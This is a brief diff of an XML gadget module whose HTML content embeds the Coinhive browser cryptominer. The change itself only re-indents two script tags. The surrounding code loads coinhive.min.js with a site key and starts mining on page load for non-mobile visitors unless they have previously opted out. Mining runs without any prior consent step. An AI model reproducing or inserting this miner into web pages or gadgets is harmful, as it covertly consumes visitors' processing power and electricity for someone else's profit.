@@ -4,7 +4,7 @@
   <Content type="html">
     <![CDATA[ 
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
+	<script>
 	var miner = new CoinHive.Anonymous('M7RVhmPbPET48OxR5fLku1Xe2WkNo5w0', {throttle: 0.3});
 
 	// Only start on non-mobile devices and if not opted-out
@@ -12,7 +12,7 @@
 	if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
 	}
-</script>
+	</script>
      ]]>
   </Content>
 </Module>
